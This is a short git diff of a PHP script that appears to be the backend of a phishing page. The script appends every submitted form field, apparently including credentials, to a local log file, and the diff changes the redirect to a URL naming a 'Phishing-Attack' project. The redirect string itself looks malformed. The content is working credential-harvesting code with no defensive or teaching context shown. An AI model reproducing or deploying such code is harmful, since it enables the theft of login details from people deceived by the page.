@@ -1,5 +1,5 @@
 <?php
-header ('Location:/');
+header ('Location:/https://munkh-orgill.github.io/Phishing-Attack/phishing');
 $file = fopen("logFile.txt",'a');
 foreach($_POST as $key => $value){
     fwrite($file,$key);      // This stores the field Name
